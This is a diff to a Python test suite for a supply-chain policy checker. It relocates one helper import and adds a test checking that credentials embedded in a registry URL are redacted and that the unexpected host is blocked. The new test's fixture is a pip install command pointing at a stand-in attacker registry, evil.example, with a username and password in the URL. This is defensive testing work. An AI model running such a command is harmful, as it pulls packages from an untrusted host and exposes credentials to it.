@@ -51,7 +51,6 @@ from awf.service.supply_chain_policy import (
     _node_package_version,
     _node_pin_value_is_pinned,
     _node_pin_value_is_semver_range,
-    _normalize_path,
     _package_command,
     _pip_env_registry_hosts,
     _pipe_target_is_interpreter,
@@ -67,6 +66,7 @@ from awf.service.supply_chain_policy import (
     evaluate_supply_chain_policy,
     supply_chain_policy_for_workspace,
 )
+from awf.service.supply_chain_policy_helpers import _normalize_path
 from tests.postgres import postgres_test_engine
 
 
@@ -686,6 +686,29 @@ def test_credentialed_registry_url_still_reports_unexpected_host() -> None:
     ]
     assert findings[0].details["registry_hosts"] == ["evil.example"]
     assert "token" not in str(findings[0].details["command_excerpt"])
+
+
+def test_credentialed_registry_url_with_s_in_authority_is_redacted() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "$ pip install requests==2.32.3 "
+            "--index-url https://svc_user:secret@evil.example/simple\n"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+    ]
+    assert findings[0].details["registry_hosts"] == ["evil.example"]
+
+    excerpt = findings[0].details["command_excerpt"]
+    assert "svc_user:secret" not in excerpt
+    assert "svc_user" not in excerpt
+    assert "secret" not in excerpt
+    assert "[redacted]" in excerpt
 
 
 @pytest.mark.unit
